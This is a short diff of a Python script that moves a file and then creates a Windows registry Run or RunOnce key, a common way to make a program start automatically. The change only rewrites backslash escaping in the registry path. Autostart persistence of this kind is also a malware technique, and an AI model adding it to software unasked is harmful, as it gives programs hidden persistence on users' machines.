@@ -13,7 +13,7 @@ shutil.move(filename, filedir)
 regkey = 1
 
 reghive = winreg.HKEY_CURRENT_USER if regkey < 2 else winreg.HKEY_LOCAL_MACHINE
-regpath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" if (regkey % 2) == 0 else "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
+regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run" if (regkey % 2) == 0 else "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
 
 reg = winreg.ConnectRegistry(None, reghive)
 key = winreg.CreateKey(reg, regpath)
